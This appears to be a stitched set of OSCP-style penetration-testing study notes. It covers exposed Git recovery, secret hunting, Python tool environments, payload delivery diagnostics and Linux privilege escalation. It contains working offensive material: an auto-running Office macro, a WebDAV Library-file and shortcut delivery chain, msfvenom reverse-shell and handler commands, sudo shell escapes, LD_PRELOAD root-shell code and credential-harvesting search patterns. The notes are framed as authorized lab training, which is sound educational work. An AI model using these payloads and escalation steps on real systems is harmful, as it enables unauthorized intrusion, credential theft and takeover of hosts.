title: 9.4.4 File and Repository Hunting
text: id="file-and-repository-hunting">9.4.4 File and Repository Hunting ← Stage index | HTTP mapping | Credential handling | Strategy map | Study methods: Map useful web behavior ; Escalate privileges on Linux ; Escalate privileges on Windows <h2

title: 9.4.4.1 Exposed Git metadata
text: id="exposed-git-metadata">9.4.4.1 Exposed Git metadata curl -ski http://TARGET:PORT/.git/HEAD curl -ski http://TARGET:PORT/.git/config A readable HEAD / config supports exposed repository metadata. A 403 , redirect or generic template is not proof. Preserve the correct host header/base path. If authorized, recover into a new local directory with a purpose-built tool and inspect locally: git-dumper http://TARGET:PORT/.git/ repo-output git -C repo-output status git -C repo-output log --oneline --all --decorate git -C repo-output log -p --all git-dumper is an optional third-party helper; install on demand in an isolated environment only when the exposure has been confirmed. Manual object recovery is possible but slower. <h2

title: 9.4.4.2 Repository secret/history search
text: id="repository-secrethistory-search">9.4.4.2 Repository secret/history search rg -ni 'password|passwd|token|secret|api[_-]?key|private[_-]?key' repo-output git -C repo-output log --all -S'password' --oneline git -C repo-output log --all -G'pass(word)?|secret|token' --oneline Inspect candidate commits without dumping all history: git -C repo-output show COMMIT -- PATH git -C repo-output diff COMMIT^ COMMIT -- PATH Validate freshness, identity and compatible use. Removed historical values are often rotated or environment-specific. <h2

title: 9.4.4.3 Linux scoped file hunting
text: id="linux-scoped-file-hunting">9.4.4.3 Linux scoped file hunting find /home /var/www /opt /srv -type f \ \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \ -o -iname '*.old' -o -iname '*.key' -o -iname '*.pem' \) 2>/dev/null rg -ni 'password|passwd|token|secret|api[_-]?key|connection(string)?' \ /var/www /opt /srv 2>/dev/null <h2

title: 9.4.4.4 Windows scoped file hunting
text: id="windows-scoped-file-hunting">9.4.4.4 Windows scoped file hunting Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'pass|cred|config|backup|unattend|\.env' } Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd' } | Select-String -Pattern 'password|passwd|secret|token|connectionString' -CaseSensitive:$false Avoid searching the entire filesystem without a reason; scope reduces noise, access errors and sensitive-data overcollection. <h2

title: 9.4.4.5 Exposed .git — recover source and old configuration
text: id="exposed-git--recover-source-and-old-configuration">9.4.4.5 Exposed .git — recover source and old configuration Use after a real .git/HEAD response, not a generic 200/default page. GitTools can recover accessible objects even when directory listing is disabled; missing objects can still leave an incomplete repository. <h3

title: 9.4.4.5.1 curl -i http://TARGET:PORT/.git/HEAD
text: id="variant-9-4-4-5-1">9.4.4.5.1 curl -i http://TARGET:PORT/.git/HEAD curl -i http://TARGET:PORT/.git/HEAD bash GitTools/Dumper/gitdumper.sh http://TARGET:PORT/.git/ recovered-git/ bash GitTools/Extractor/extractor.sh recovered-git/ recovered-files/ <h3

title: 9.4.4.5.2 Inspect recovered history and a specific revision; do not run recovered code
text: id="variant-9-4-4-5-2">9.4.4.5.2 Inspect recovered history and a specific revision; do not run recovered code # Inspect recovered history and a specific revision; do not run recovered code git -C recovered-git log --all --oneline git -C recovered-git show COMMIT:PATH/TO/FILE Read: connection strings, routes, secret-handling code and removed credentials can identify the next request or account to test. Verify a recovered value in its actual context. A repository skeleton or one HEAD file does not prove complete recovery; inspect extractor output and errors before concluding that a file never existed. Sources: upstream 1 . <h2

title: 9.4.4.6 Sources
text: id="sources">9.4.4.6 Sources getSH Useful Stuff: Git & File Hunting , source snapshot e1f62dd git-dumper Git log documentation

title: 9.4.5 Python Tool Environments
text: id="python-tool-environments">9.4.5 Python Tool Environments ← Stage index | Tool selection matrix | Strategy map | Study methods: Select and adapt public exploits Use when: a source-based Python assessment tool has dependencies that should not modify Kali's system Python. This is setup/reference material, not authorization to install a tool. <h2

title: 9.4.5.1 Linux/Kali virtual environment
text: id="linuxkali-virtual-environment">9.4.5.1 Linux/Kali virtual environment python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt Install one explicitly selected package only when needed: python -m pip install PACKAGE python -m pip show PACKAGE python -m pip freeze deactivate PEP 668 intentionally protects externally managed system environments. Do not bypass it with --break-system-packages ; use a venv or the distribution package when appropriate. <h2

title: 9.4.5.2 Windows PowerShell
text: id="windows-powershell">9.4.5.2 Windows PowerShell py -m venv .venv .\.venv\Scripts\Activate.ps1 python -m pip install --upgrade pip python -m pip install -r requirements.txt deactivate <h2

title: 9.4.5.3 Reproducibility checks
text: id="reproducibility-checks">9.4.5.3 Reproducibility checks python --version python -m pip --version python -m pip freeze > requirements-resolved.txt Record the tool source/commit, Python version, dependency file and exact command. Keep environments per tool when their dependency ranges conflict. <h2

title: 9.4.5.4 uv alternative for a Python PoC with missing dependencies
text: id="uv-alternative-for-a-python-poc-with-missing-dependencies">9.4.5.4 uv alternative for a Python PoC with missing dependencies Use when uv is already available and the reviewed script needs a small dependency set. Keep the baseline venv workflow as an option when uv is absent. <h3

title: 9.4.5.4.1 Run outside the current project's dependencies, supplying the known dependency
text: id="variant-9-4-5-4-1">9.4.5.4.1 Run outside the current project's dependencies, supplying the known dependency # Run outside the current project's dependencies, supplying the known dependency uv run --no-project --with requests exploit.py --help <h3

title: 9.4.5.4.2 For a script with its own inline dependency metadata
text: id="variant-9-4-5-4-2">9.4.5.4.2 For a script with its own inline dependency metadata # For a script with its own inline dependency metadata uv run --script exploit.py --help Read: a working help/import path establishes the local runtime only. Inspect actual arguments, authentication and target requirements before execution. Pin dependency versions when the PoC depends on an older API; an ImportError and a target-side exploit failure are different boundaries. Dependency resolution can require Internet access. Sources: upstream 1 . <h2

title: 9.4.5.5 Sources
text: id="sources">9.4.5.5 Sources getSH Useful Stuff: Python Environments , source snapshot e1f62dd Python venv documentation PEP 668

title: 9.4.6 Payload Execution Obstacles
text: id="payload-execution-obstacles">9.4.6 Payload Execution Obstacles ← Stage index | Shells and payloads | File transfer | Payload-execution cheatsheet | Strategy map | Study methods: Resolve payload execution obstacles Goal: determine the first failed boundary between delivery and a usable session, then change only the condition responsible. Commands are generic authorized-lab references. Client-side delivery requires explicit scope and the intended exercise user interaction. <h2

title: 9.4.6.1 Preserve the execution chain
text: id="1-preserve-the-execution-chain">9.4.6.1 Preserve the execution chain artifact/request → delivered to intended consumer → required user/trigger action → parser/interpreter/loader → process or bounded side effect → network connection → handler protocol → usable session Boundary Decisive evidence Does not prove Delivery Expected bytes, request, document or shortcut arrives intact It was opened or parsed Trigger Intended user/service/parser consumed it Child process started Execution Harmless marker, process or command output Callback route works Connection Expected peer reaches listener Payload and handler agree Session Commands return; host and identity verified Stability or privilege Do not replace the artifact, payload, listener and route simultaneously. Record the last confirmed boundary and test the next one. <h2

title: 9.4.6.2 Fast diagnostic order
text: id="2-fast-diagnostic-order">9.4.6.2 Fast diagnostic order Reproduce a harmless direct command in the exact vulnerable or user context. Confirm file/request integrity, final path and consumer. Identify every parser, interpreter and loader. Match target OS, process architecture, artifact format and runtime dependencies. Verify permissions, working directory, execution policy and application-control evidence. Start the correct listener/handler and prove its bind. Prove the target-to-listener route separately. Inspect concrete antimalware, application-control and process-failure evidence. Repair session I/O only after a connection exists. If step 1 fails, this is not yet a payload problem. Return to the exploit, input parser or execution primitive. <h2

title: 9.4.6.3 Client-side attacks are gated chains
text: id="3-client-side-attacks-are-gated-chains">9.4.6.3 Client-side attacks are gated chains Client-side access adds two prerequisites that service exploitation does not normally have: the artifact must reach the intended user and application; the user or application must perform the action that reaches the execution sink. Before choosing a document or shortcut, establish the target OS, installed application/version, delivery route, expected security zone, required interaction, target egress and callback route. A generic file that depends on absent software is not a viable attack. <h3

title: 9.4.6.3.1 Office macro chain
text: id="31-office-macro-chain">9.4.6.3.1 Office macro chain Use a macro-enabled format such as .docm or a legacy .doc ; .docx does not persist embedded VBA macros by itself. Store the macro in the document, not only the global template. A minimal harmless execution proof is: Sub AutoOpen() RunProof End Sub Sub Document_Open() RunProof End Sub Sub RunProof() CreateObject("WScript.Shell").Run _ "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True End Sub AutoOpen and Document_Open cover distinct Word opening paths. Replace the proof command only after the document, trigger and execution context are confirmed. Modern Office commonly blocks VBA macros in files carrying Mark of the Web rather than offering a universal one-click enable path. Relevant gates include: file format actually supports the macro; macro is stored in the delivered document; MOTW/Zone Identifier and security zone; Protected View and Trust Center settings; signed publisher or Trusted Location decisions; organization GPO that the user cannot override; user opened the document and performed the required permitted action; Office launched the expected child process; the child command survived VBA, CMD and PowerShell quoting; delivery and callback network paths both work. Inspect a file's zone without changing it: Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream * Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier ZoneId=3 represents the Internet zone. Absence of the stream does not prove that macro policy permits execution, and removing MOTW does not override every policy. <h3

title: 9.4.6.3.2 Windows Library file plus shortcut
text: id="32-windows-library-file-plus-shortcut">9.4.6.3.2 Windows Library file plus shortcut A .Library-ms file is an XML library description that can present a remote location in Explorer. The PEN-200 attack pattern is two-stage: delivered .Library-ms → user opens library → Explorer reaches WebDAV location → user opens .lnk → shortcut launches chosen command → optional download/callback If WsgiDAV is already installed, publish a dedicated authorized-lab directory: mkdir -p webdav wsgidav --host=0.0.0.0 --port=80 \ --root=./webdav --auth=anonymous Anonymous mode exposes the selected directory. Bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise. Port 80 is the reliable baseline for a plain-HTTP Windows WebDAV location. Use another port only after confirming the target WebClient accepts that URL form and the route permits it. Original library template using placeholders: <?xml version="1.0" encoding="UTF-8"?> <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"> <name>@windows.storage.dll,-34582</name> <version>1</version> <isLibraryPinned>true</isLibraryPinned> <iconReference>imageres.dll,-1002</iconReference> <templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo> <searchConnectorDescriptionList> <searchConnectorDescription> <isDefaultSaveLocation>true</isDefaultSaveLocation> <isSupported>false</isSupported> <simpleLocation> <url>http://LHOST/</url> </simpleLocation> </searchConnectorDescription> </searchConnectorDescriptionList> </libraryDescription> Save it with a .Library-ms extension. Windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery. Create a shortcut on a controlled Windows preparation host: $shortcutPath = 'C:\PATH\webdav\ACTION.lnk' $shell = New-Object -ComObject WScript.Shell $shortcut = $shell.CreateShortcut($shortcutPath) $shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe" $shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt' $shortcut.WorkingDirectory = $env:TEMP $shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11" $shortcut.Save() Only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. Diagnose this chain at three independent network points: Explorer → WebDAV shortcut command → optional payload/download server executed payload → listener/handler Failure cues: Observation Next boundary Library opens empty WebDAV bind, reachability, WebClient/policy, modified library serialization WebDAV receives nothing Artifact not opened, URL/port wrong, client route or WebDAV blocked Directory appears; shortcut never runs Required second user action absent or shortcut blocked Marker works; download absent Command quoting, DNS and payload-server route Download occurs; no execution Format, permissions, policy, quarantine or dependency Execution proven; no callback Listener, route, payload/handler compatibility <h2

title: 9.4.6.4 Match artifact to its consumer
text: id="4-match-artifact-to-its-consumer">9.4.6.4 Match artifact to its consumer The file extension is not the execution contract. Record all of these: target OS and build target process architecture artifact format loader/interpreter execution identity and integrity working directory and PATH required runtime/libraries arguments and quoting network direction handler protocol <h3

title: 9.4.6.4.1 Linux checks
text: id="41-linux-checks">9.4.6.4.1 Linux checks uname -a uname -m file PAYLOAD readelf -h PAYLOAD | sed -n '1,25p' ldd PAYLOAD ls -l PAYLOAD findmnt -T /PATH/TO/PAYLOAD head -n 1 SCRIPT Common interpretations: Exec format error : wrong format/architecture or invalid interpreter line; Permission denied : missing execute permission, inaccessible parent directory, noexec , policy or identity issue; No such file or directory when the file exists: missing dynamic loader or broken shebang interpreter; missing shared object: runtime library mismatch; ^M in a shebang: CRLF line endings changed the interpreter path; works interactively but not through cron/service: environment, working directory, shell, identity or route differs. <h3

title: 9.4.6.4.2 Windows checks
text: id="42-windows-checks">9.4.6.4.2 Windows checks Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture [Environment]::Is64BitOperatingSystem [Environment]::Is64BitProcess $env:PROCESSOR_ARCHITECTURE Get-AuthenticodeSignature -FilePath 'C:\PATH\PAYLOAD.exe' Keep OS architecture and consumer-process architecture separate. A 64-bit OS can run a 32-bit process under WOW64; injected code and DLLs must match the process they enter. A normal executable is not necessarily a service executable, DLL, MSI or script: Consumer Required property / common failure Direct process creation Compatible PE/ELF/script and dependencies Windows service Service-compatible entry/control behavior; error 1053 may follow execution of a non-service program DLL loader/hijack Correct bitness, expected exports and dependency behavior msiexec Valid MSI package, not an EXE renamed .msi PowerShell Valid syntax, edition/runtime compatibility and applicable policy/control state Existing memory-corruption PoC Documented architecture, space, bad characters and exit behavior <h2

title: 9.4.6.5 Parser, command-line and length failures
text: id="5-parser-command-line-and-length-failures">9.4.6.5 Parser, command-line and length failures Write the real chain: document/shortcut or HTTP/SQL/template input → application parser → VBA/WScript/application runtime → cmd.exe /c, /bin/sh -c or PowerShell → final command/payload Start with a short marker at every layer. Check: quote ownership at each layer; expansion of %VAR% , $VAR and PowerShell variables; metacharacters such as & , | , < , > , ; , backticks and parentheses; URL/JSON/XML/Base64 decode count; command-line, VBA-string, request-field or exploit-buffer length; current directory and relative paths. PowerShell encoded-command preparation: $command = 'COMMAND' $bytes = [Text.Encoding]::Unicode.GetBytes($command) [Convert]::ToBase64String($bytes) powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE -EncodedCommand uses UTF-16LE. It solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion. <h2

title: 9.4.6.6 PowerShell control layers
text: id="6-powershell-control-layers">9.4.6.6 PowerShell control layers Do not merge these different controls: Control What it changes Useful evidence Execution policy Conditions for loading/running scripts Get-ExecutionPolicy -List and exact error Language mode Available PowerShell language features $ExecutionContext.SessionState.LanguageMode AMSI Submits supported script/content to antimalware Explicit block/error plus Defender/PowerShell events AppLocker/WDAC Application/script allow policy Effective policy and application-control events Defender/other AV File, memory, behavior and network decisions Status, detection history, quarantine/events Permissions File/process/service/ token rights Access-denied result under named identity Read-only checks: Get-ExecutionPolicy -List $ExecutionContext.SessionState.LanguageMode Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled, BehaviorMonitorEnabled,IoavProtectionEnabled,AntivirusSignatureVersion Get-MpThreatDetection | Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources Get-AppLockerPolicy -Effective -Xml Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,LevelDisplayName,Message Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message Cmdlets, logs and fields vary by edition, installed modules, permissions and control product. Missing output is inconclusive . Execution policy is defense in depth, not a Windows security boundary. A process-scoped policy setting may change script-loading behavior when GPO does not override it: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\PATH\SCRIPT.ps1 This does not disable AMSI, application control, antimalware, permissions or network controls. Do not change persistent machine/user policy merely to test a payload. <h2

title: 9.4.6.7 Interpret control evidence
text: id="7-interpret-control-evidence">9.4.6.7 Interpret control evidence Observation Most useful next action Transferred hash differs Repair transfer/encoding before execution File arrives then vanishes Inspect quarantine/detection events and resource path File remains; process creation denied Inspect AppLocker/WDAC, permissions and parent process Script-loading policy error Inspect scope/precedence; use an authorized process-only invocation if applicable Explicit AMSI/content block Treat content/control as confirmed; encoding alone is not a supported conclusion Process starts then exits Capture exit/error, dependency and architecture evidence Process remains; no connection Test target egress, LHOST and listener TCP handshake then close Handler/payload mismatch, stage failure, crash or control interruption Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore: changing a filename does not imply a new payload; Base64 does not imply concealment from AMSI; an in-memory technique is not automatically invisible; an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass; a clean third-party scanner result does not prove execution on the target and may disclose a private sample. Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun. <h2

title: 9.4.6.8 Generate only after selecting the context
text: id="8-generate-only-after-selecting-the-context">9.4.6.8 Generate only after selecting the context msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options Baseline stageless command shells: msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f exe -o shell.exe file shell.elf shell.exe sha256sum shell.elf shell.exe Existing reviewed PoC with documented byte restrictions: msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ EXITFUNC=thread \ -f FORMAT -v VARIABLE \ -b 'BAD_CHARACTERS' -s MAX_SPACE Use EXITFUNC only when the exploit/consumer requires that termination behavior. Never invent bad characters or size limits. Staging distinction: windows/x64/shell_reverse_tcp single/stageless windows/x64/shell/reverse_tcp staged A staged payload first connects and asks its handler for the larger stage. A raw Netcat listener cannot supply that protocol. <h2

title: 9.4.6.9 multi/handler and session lifecycle
text: id="9-multihandler-and-session-lifecycle">9.4.6.9 multi/handler and session lifecycle Matching handler: msfconsole -q use exploit/multi/handler set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT set ExitOnSession false show options run -j Manage the resulting job/session deliberately: jobs -l sessions -l sessions -i SESSION_ID background sessions -k SESSION_ID jobs -k JOB_ID ExitOnSession false keeps the handler available after a session opens. run -j backgrounds the handler. A session ID is local to that framework instance; record the target, identity, payload and listener rather than relying on the number alone. Handler failure cues: Output Interpretation Handler never binds Bad local address, occupied port or privilege issue Raw listener receives connection; framework does not Different port/interface or payload transport Handler receives connection but no session Exact payload/stager mismatch, stage blocked or crash Session opens then dies Parent exits, payload exit behavior, route/control or process crash Session opens as unexpected architecture/type Default payload or target was not explicitly selected <h2

title: 9.4.6.10 Metasploit module workflow and exam boundary
text: id="10-metasploit-module-workflow-and-exam-boundary">9.4.6.10 Metasploit module workflow and exam boundary Manual module inspection: search type:exploit cve:CVE_ID info MODULE_PATH use MODULE_PATH show options show advanced show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT show missing run Interpretation rules: module rank describes expected exploit stability, not target vulnerability; check is an active module operation and does not prove exploitability when unsupported or inconclusive; target IDs, default payloads and options vary by module/version; automatic target selection is still an assumption to verify; a module's success message is weaker than a verified session, host and identity; setg persists values across modules and can silently aim later work at the wrong host; prefer local set unless global state is intentionally tracked. Current OSCP+ restriction: msfvenom and exploit/multi/handler may be used against all targets, except that a Meterpreter payload remains subject to the one-target limit; any Metasploit Auxiliary, Exploit or Post module—or Meterpreter payload—locks the selection to one target, even if check or the attack fails; Metasploit pivoting is prohibited; automatic exploitation tools are prohibited. Use manual/source-reviewed exploitation as the reusable baseline. Decide on the restricted Metasploit target deliberately and record that decision before using a restricted module or Meterpreter. <h2

title: 9.4.6.11 Worked diagnostic paths
text: id="11-worked-diagnostic-paths">9.4.6.11 Worked diagnostic paths <h3

title: 9.4.6.11.1 A. Document delivered, no callback
text: id="a-document-delivered-no-callback">9.4.6.11.1 A. Document delivered, no callback Observed: document exists Unknown: opened, macro permitted, child command, network route Test: MOTW/policy → harmless marker → child process/download → callback route Action: repair first failed gate; do not regenerate the payload first <h3

title: 9.4.6.11.2 B. Executable disappears after transfer
text: id="b-executable-disappears-after-transfer">9.4.6.11.2 B. Executable disappears after transfer Observed: transfer response succeeded Test: destination listing/hash → Defender detection/resource/event Interpretation: transfer success is not retention; quarantine requires evidence Action: choose a justified alternate execution form or native route, within scope <h3

title: 9.4.6.11.3 C. PowerShell says scripts are disabled
text: id="c-powershell-says-scripts-are-disabled">9.4.6.11.3 C. PowerShell says scripts are disabled Observed: explicit execution-policy error Test: Get-ExecutionPolicy -List and GPO precedence Action: use a process-scoped invocation if allowed; do not call this an AMSI result <h3

title: 9.4.6.11.4 D. Connection reaches Netcat but there is no shell
text: id="d-connection-reaches-netcat-but-there-is-no-shell">9.4.6.11.4 D. Connection reaches Netcat but there is no shell Observed: TCP connection Test: generated payload name Interpretation: staged payload may have reached a raw listener Action: use exact multi/handler or generate a compatible stageless command shell <h3

title: 9.4.6.11.5 E. Binary exists but returns “not found” on Linux
text: id="e-binary-exists-but-returns-not-found-on-linux">9.4.6.11.5 E. Binary exists but returns “not found” on Linux Observed: path and file exist Test: file, readelf interpreter, ldd, shebang Interpretation: loader/interpreter dependency may be missing Action: build/choose a compatible artifact; do not change callback settings <h3

title: 9.4.6.11.6 F. Metasploit module reports completion, no session
text: id="f-metasploit-module-reports-completion-no-session">9.4.6.11.6 F. Metasploit module reports completion, no session Observed: module ran Test: exact target profile, payload, callback route, handler output and service state Interpretation: completion is not verified execution/session Action: preserve module output and diagnose the first missing state <h2

title: 9.4.6.12 Evidence and cleanup
text: id="12-evidence-and-cleanup">9.4.6.12 Evidence and cleanup Record: source and hash of the original artifact or exploit; exact changes and payload-generation command; delivery path and resulting hash; required user/trigger action; OS, process architecture, format and runtime assumptions; handler payload, bind and route; security-control errors/events used for diagnosis; verified host, identity and session type; listener/job/process/artifact cleanup. Remove temporary documents, shortcuts, WebDAV content, payloads, handler jobs and policy changes created for the authorized exercise. Do not claim AV evasion, user execution or a session without observed evidence. <h2

title: 9.4.6.13 Tooling for this section
text: id="tooling-for-this-section">9.4.6.13 Tooling for this section Tool Purpose Required context Baseline Decisive output Failure cue file / readelf / ldd Validate Linux format, architecture and runtime Local artifact or target shell Section 4.1 Matching format/interpreter/libraries Existing file returns loader error PowerShell built-ins Inspect architecture, zone, policy and logs Windows command execution; permissions vary Sections 3–7 Specific policy/status/event Missing cmdlet/log is inconclusive WsgiDAV Conditional WebDAV stage for Library-file exercise Installed server, permitted bind and client route Section 3.2 OPTIONS/GET and Explorer access Empty library or no server request msfvenom Generate a selected payload representation Known OS/arch/format/staging/route Section 8 Expected metadata and artifact Successful generation alone proves nothing on target multi/handler Receive exact framework/staged protocol Matching payload and reachable listener Section 9 Expected session opens Connection without session implies mismatch/stage failure Netcat/Ncat Raw listener and simple socket proof Compatible raw command shell or test connection Related shell procedure Expected peer and usable I/O Cannot stage a framework payload tcpdump /packet capture Localize connection boundary Capture permission and correct interface tcpdump -ni any tcp port LPORT SYN/handshake/close sequence No packet cannot by itself identify earlier failed layer <h2

The narrow mechanics above were checked against current official sources; the dedicated AMSI-bypass resource was not imported because deep bypass development is outside this speedrun.

title: 9.4.0 Stage 04: Shells, Transfers and Credentials
text: id="stage-04-shells-transfers-and-credentials">9.4.0 Stage 04: Shells, Transfers and Credentials ← Main index | Strategy map | Study methods: Map useful web behavior ; Recover and use authentication material ; Select and adapt public exploits ; Establish sessions and move files ; Escalate privileges on Linux ; Gain a more useful domain identity ; Resolve payload execution obstacles ; Escalate privileges on Windows Purpose: make execution usable, move tools/evidence through an explicitly understood route, and classify/recover/test authentication material without confusing authentication with authorization . Task Use it to File transfer Serve or copy tools to Linux/Windows targets and retrieve output through HTTP, SSH, SMB, Netcat or encoded text Shells and payloads Choose direct/reverse/bind/authenticated access, match payload format/architecture, repair a session and diagnose callbacks Credential use and cracking Classify passwords, keys, hashes, responses and tickets; crack supported material and validate compatible reuse File and repository hunting Inspect exposed Git metadata/history and search scoped Linux/Windows paths for configuration or secret candidates Python tool environments Isolate source-tool dependencies from system Python and record a reproducible environment Payload execution obstacles Diagnose client-side delivery, format/architecture/runtime, PowerShell/security controls, handlers and restricted Metasploit use Exit condition: the session or credential transition is verified under a named host/identity/context; transfer direction/integrity and authentication/authorization boundaries are recorded; the new state is re-enumerated.

title: 9.5.1 Linux Privilege Escalation
text: id="linux-privilege-escalation">9.5.1 Linux Privilege Escalation ← Stage index | Quick sheet | Master Notes | File transfer | Strategy map | Study methods: Escalate privileges on Linux Model: controlled object → effective permission → privileged consumer → execution identity → trigger → effect → verified identity. First pass: confirm the session identity, run the LinPEAS baseline early, then verify its exact finding. For short-lived scheduled commands use pspy and inspect the consumed path. <h2

title: 9.5.1.1 Establish current state
text: id="1-establish-current-state">9.5.1.1 Establish current state Decisive output: current identity/groups, OS/kernel/architecture, network position, root-owned activity, mounts and exact sudo rules. hostname; id; groups uname -a; cat /etc/os-release; getconf LONG_BIT pwd; umask; env ip addr; ip route; ss -lntup; ss -lxnp ps auxf mount; findmnt; lsblk; df -hT sudo -n -l 2>&1 sudo -l getent passwd awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd Priority: credentials/sudo → root-consumed writable objects → SUID/capabilities → privileged groups/mounts/local services → PATH/libraries/wildcards → software/kernel. <h2

title: 9.5.1.2 Prove permissions, including parents and mounts
text: id="2-prove-permissions-including-parents-and-mounts">9.5.1.2 Prove permissions, including parents and mounts namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. nosuid defeats SUID/SGID and file-capability effects; noexec blocks direct execution; ro blocks changes. Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under /etc , /opt , /usr/local , application paths and service working directories: find / -xdev -type f -writable -ls 2>/dev/null find / -xdev -type d -writable -ls 2>/dev/null <h2

title: 9.5.1.3 Hunt credentials and service trails
text: id="3-hunt-credentials-and-service-trails">9.5.1.3 Hunt credentials and service trails history 2>/dev/null find /home /root -maxdepth 3 -type f \ \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \ -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \ -readable 2>/dev/null grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \ /var/www /opt /srv /etc 2>/dev/null | head -n 200 Inspect process arguments and readable process environment: ps auxww ps eww -u root 2>/dev/null tr '\0' ' ' < /proc/PID/cmdline 2>/dev/null; echo tr '\0' '\n' < /proc/PID/environ 2>/dev/null Check reusable local sessions/agents only when their sockets are accessible: w; who; last -n 20 env | grep -E 'SSH_AUTH_SOCK|TMUX|STY' tmux ls 2>/dev/null screen -ls 2>/dev/null find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null An agent, tmux/screen or daemon socket needs effective socket access and a useful authenticated/privileged session. Presence alone is not session hijacking. Next: identify the value's user/service context, validate the smallest relevant transition ( su , sudo , SSH or application authentication ), then re-enumerate. Use credential handling for cracking/reuse. <h2

title: 9.5.1.4 Sudo: parse the complete rule
text: id="4-sudo-parse-the-complete-rule">9.5.1.4 Sudo: parse the complete rule sudo -n -l 2>&1 sudo -l sudo --version Record the run-as identity, password tag, executable path, argument constraints/wildcards and SETENV / NOSETENV / env_keep / secure_path / NOEXEC . Match the exact mode under GTFOBins . sudo /usr/bin/find . -exec /bin/sh \; -quit sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}' sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' Use an example only when the entire rule permits it. Restricted arguments, another path/build, privilege dropping, NOEXEC , a non-root run-as user or MAC policy can invalidate the escape. <summary

title: 9.5.1.4.1 Preserved LD_PRELOAD variant
text: id="variant-9-5-1-4-1">9.5.1.4.1 Preserved LD_PRELOAD variant Requires an explicitly allowed/preserved variable and a dynamically linked allowed program. sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD' #include <stdlib.h> #include <unistd.h> void _init(void) { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/sh"); } gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM Static linking, secure-loader behavior, missing environment permission or MAC denial disproves this route. <h2

title: 9.5.1.5 SUID, SGID and capabilities
text: id="5-suid-sgid-and-capabilities">9.5.1.5 SUID, SGID and capabilities find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null getcap -r / 2>/dev/null Rank nonstandard/custom paths, unexpected versions, writable binaries/parents and dangerous interpreters. Inspect one candidate: namei -l /PATH/TO/BINARY stat /PATH/TO/BINARY file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' ldd /PATH/TO/BINARY 2>/dev/null strings /PATH/TO/BINARY | head -n 150 dpkg -S /PATH/TO/BINARY 2>/dev/null rpm -qf /PATH/TO/BINARY 2>/dev/null Look for a documented SUID/capability primitive, unsafe relative helper, arbitrary file operation, user-controlled config/plugin or exact vulnerable version. Normal distribution SUID files are not findings by themselves. <summary

title: 9.5.1.5.1 Capability interpretation and example
